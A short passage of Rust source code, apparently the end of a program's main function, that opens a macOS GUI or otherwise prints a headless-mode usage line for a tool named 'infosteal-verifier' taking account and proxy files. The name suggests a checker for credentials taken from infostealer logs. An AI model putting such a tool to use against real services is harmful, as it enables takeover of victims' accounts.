            state.results_dir.lock().unwrap().display()
        );
    } else {
        #[cfg(target_os = "macos")]
        {
            macos_gui::run(state, preload);
        }
        #[cfg(not(target_os = "macos"))]
        {
            print_help();
            eprintln!(
                "\n[!] The native desktop GUI is macOS-only (AppKit). On {} use headless mode:\n    \
                 infosteal-verifier --accounts <file> --proxies <file>",
                env::consts::OS
            );
            std::process::exit(1);
        }
    }
}
